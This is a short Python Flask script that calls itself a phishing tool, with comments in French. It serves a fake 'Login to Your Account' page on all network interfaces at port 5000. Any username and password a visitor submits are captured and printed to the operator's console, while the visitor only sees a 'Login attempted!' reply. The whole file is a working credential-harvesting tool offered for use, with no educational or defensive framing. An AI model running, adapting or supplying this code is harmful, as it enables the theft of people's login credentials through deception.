from flask import Flask, request, render_template_string
import colorama
from colorama import Fore

# Initialiser Colorama
colorama.init(autoreset=True)

app = Flask(__name__)

# Template HTML pour la page de phishing
phishing_page = """
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Login Page</title>
  </head>
  <body>
    <h2>Login to Your Account</h2>
    <form method="POST">
      <label for="username">Username:</label><br>
      <input type="text" id="username" name="username"><br>
      <label for="password">Password:</label><br>
      <input type="password" id="password" name="password"><br><br>
      <input type="submit" value="Login">
    </form>
  </body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        print(Fore.CYAN + f"Captured credentials - Username: {username}, Password: {password}")
        return "Login attempted!"

    return render_template_string(phishing_page)

def main():
    print(Fore.CYAN + "=== Phishing Tool ===")
    app.run(host='0.0.0.0', port=5000)  # Exécute le serveur sur le port 5000

if __name__ == "__main__":
    main()
